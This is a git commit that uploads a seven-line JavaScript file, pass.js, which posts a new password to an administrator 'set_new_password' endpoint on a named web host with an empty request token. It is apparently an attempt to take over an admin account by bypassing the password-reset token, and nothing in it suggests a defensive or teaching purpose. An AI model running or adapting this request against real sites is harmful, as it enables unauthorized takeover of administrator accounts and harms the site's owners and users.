088243fd428786138e1a16764a074efaca2c6eaa
tomoncrss <tonymyson89823@gmail.com>
2025-07-24 07:52:21 +0330

    Add files via upload

---
+++ pass.js
@@ -0,0 +1,7 @@
+fetch("https://test.meetsoci.com/api/admin/0/set_new_password?request_token=", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/x-www-form-urlencoded"
+  },
+  body: "password=JJASkjjk%40jhj98jjk"
+});
